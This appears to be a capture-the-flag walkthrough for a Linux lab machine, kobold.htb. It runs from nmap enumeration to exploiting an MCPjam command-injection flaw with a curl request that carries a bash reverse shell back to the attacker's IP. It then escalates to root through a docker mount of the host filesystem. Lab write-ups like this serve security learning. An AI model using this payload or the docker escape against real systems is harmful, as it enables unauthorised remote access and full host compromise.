OS: Linux

# Enumeration

### Nmap

We run an initial scan to find the open ports:

![[Pasted image 20260407192912.png]]

Then a scan against each service on each port:

```bash
sudo nmap 10.129.245.50 -p22,80,443,3552 -sCV -T5 -v
```

```console
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 20:10 -0400
Nmap scan report for 10.129.245.50
Host is up (0.18s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
3552/tcp open  http     Golang net/http server
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Web analysis

In this section we start looking at the web for vulnerabilities. First, we see the domain is kobold.htb, so we need to add it to `/etc/hosts`, otherwise we won't be able to reach the website:

![[Pasted image 20260407195122.png]]

We add it to `/etc/hosts`:

![[Pasted image 20260407195259.png]]

Accessing the site redirects us automatically from http to https, and we can see there isn't much of interest:

![[Pasted image 20260407195411.png]]

Directory fuzzing doesn't find anything, so we look for subdomains of `.kobold.htb`:

![[Pasted image 20260407201920.png]]

We find two main ones (mcp, bin), but we'll focus on mcp. To reach it we add it to `/etc/hosts`:

![[Pasted image 20260408194840.png]]

Now we can visit the page:

![[Pasted image 20260408194658.png]]
![[Pasted image 20260407202037.png]]

We see an MCPjam page. If we click "Add Your First Server", we can specify a command, and it runs version 1.4.2, which is vulnerable to CVE-2026-23744. To exploit it we find the following curl request, which is nothing more than a request to the MCPjam API:

![[Pasted image 20260408193625.png]]

We need to tweak this curl request to make it work, but first we set up a listener with Netcat (`nc`):

```bash
curl https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"bash\",\"args\":[\"-c\", \"bash -i >& /dev/tcp/10.10.14.77/5555 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}" -k
```

We receive the connection:

![[Pasted image 20260410104210.png]]

Since we landed as the user ben, we create an SSH key pair to get a more usable shell:

![[Pasted image 20260410105519.png]]

We connect using the private key we obtained:

![[Pasted image 20260410105427.png]]

Now we need to escalate privileges to root. We aren't part of the docker group, but we can add ourselves with `newgrp docker`. Being in this group is almost like having root, since we can mount the whole filesystem from the root into a container with the following command:

```bash
docker run -v /:/mnt --rm -it mysql:latest chroot /mnt sh
```

![[Pasted image 20260410174214.png]]

# Machine complete
